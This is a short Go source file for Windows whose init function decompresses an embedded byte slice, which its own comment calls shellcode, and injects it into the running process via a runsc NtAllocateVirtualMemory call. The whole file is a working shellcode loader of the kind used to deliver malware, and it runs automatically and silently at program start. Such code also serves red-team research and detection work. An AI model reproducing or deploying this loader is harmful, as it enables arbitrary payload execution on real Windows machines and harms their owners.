//go:build windows
// +build windows

package main

import (
	"bytes"
	"compress/gzip"
	"io/ioutil"

	"gitlab.com/mjwhitta/runsc"
)

func init() {
	var e error
	var g *gzip.Reader

	// Return if no shellcode
	if len(sc) == 0 {
		return
	}

	// Uncompress
	if g, e = gzip.NewReader(bytes.NewReader(sc)); e != nil {
		return
	}
	defer g.Close()

	if sc, e = ioutil.ReadAll(g); e != nil {
		return
	}

	// Launch shellcode into current process using
	// NtAllocateVirtualMemory. See gitlab.com/mjwhitta/runsc for
	// other methods.
	if e = runsc.WithNtAllocateVirtualMemory(0, sc); e != nil {
		return
	}
}
